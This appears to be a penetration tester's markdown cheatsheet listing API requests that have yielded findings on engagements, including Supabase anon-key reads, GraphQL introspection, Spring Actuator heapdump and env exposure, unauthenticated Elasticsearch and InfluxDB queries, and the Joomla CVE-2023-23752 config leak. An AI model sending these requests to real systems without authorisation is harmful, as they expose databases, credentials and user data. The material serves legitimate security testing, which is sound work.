---
title: "API Request Findings"
type: cheatsheet
tags: [api, cheatsheet, web]
sources: []
date_created: 2026-06-05
date_updated: 2026-06-05
---

# API Request Findings

Reusable API request patterns that have produced findings. Product/tech + the request + what it reveals. **Client-agnostic**: record the generic pattern only; client URLs/data stay in `targets/<eng>/`. When you meet the same tech again, replay from here.

`impact`: what a positive result means. `auth`: what auth (if any) the request needs.

| product/tech | endpoint | method | request / payload | auth | reveals / impact |
|--------------|----------|--------|-------------------|------|------------------|
| Supabase | `/rest/v1/<table>` | GET | header `apikey:<anon>` | anon key | reads rows if no RLS policy -> data exposure |
| Supabase | `/auth/v1/signup` | POST | `{email,password}` | none | open registration; check `user_metadata` for priv-esc |
| GraphQL | `/graphql` | POST | introspection query `{__schema{types{name}}}` | varies | full schema -> hidden mutations/fields |
| Strapi | `/admin/init` | GET | - | none | reveals if admin not yet provisioned (takeover) |
| Elasticsearch | `/_cat/indices` | GET | - | none (pre-8) | index list -> data dump via `/_search` |
| InfluxDB 1.x | `/query?q=SHOW+DATABASES` | GET | - | often none | DB enum; `/query?q=` arbitrary InfluxQL |
| Actuator (Spring) | `/actuator/env`, `/actuator/heapdump` | GET | - | often none | secrets/creds in env or heap |
| Swagger / OpenAPI | `/swagger.json`, `/openapi.json`, `/v3/api-docs` | GET | - | none | full endpoint map -> hidden APIs |
| Joomla 4.0.0-4.2.7 | `/api/index.php/v1/config/application?public=true` | GET | needs `Accept: */*` (else 406 Not Acceptable) | none - CVE-2023-23752 | DB host/user/password + dbprefix; `/api/index.php/v1/users?public=true` leaks Super-User names/emails |

## How to extend
When a request pattern yields a finding on an engagement, add the **generic** form here (product, endpoint shape, payload, impact). Strip client host/path specifics. Cross-link the relevant technique page (e.g. [[supabase-attacks]], [[graphql]]).

<!-- promoted-slug: joomla-cve-2023-23752 -->
